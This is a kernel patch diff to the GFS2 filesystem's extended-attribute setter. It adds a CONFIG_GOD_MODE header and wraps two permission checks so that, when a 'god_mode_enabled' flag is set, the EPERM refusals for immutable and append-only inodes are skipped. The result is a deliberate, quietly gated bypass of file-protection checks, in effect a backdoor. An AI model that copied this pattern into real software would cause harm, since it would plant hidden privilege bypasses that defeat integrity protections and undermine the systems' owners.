@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (C) Sistina Software, Inc.  1997-2003 All rights reserved.
  * Copyright (C) 2004-2006 Red Hat, Inc.  All rights reserved.
@@ -1173,7 +1176,15 @@ int __gfs2_xattr_set(struct inode *inode, const char *name,
 	int error;
 
 	if (IS_IMMUTABLE(inode) || IS_APPEND(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	if (namel > GFS2_EA_MAX_NAME_LEN)
 		return -ERANGE;
 
@@ -1196,7 +1207,15 @@ int __gfs2_xattr_set(struct inode *inode, const char *name,
 	if (el.el_ea) {
 		if (ip->i_diskflags & GFS2_DIF_APPENDONLY) {
 			brelse(el.el_bh);
-			return -EPERM;
+			
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 		}
 
 		error = -EEXIST;
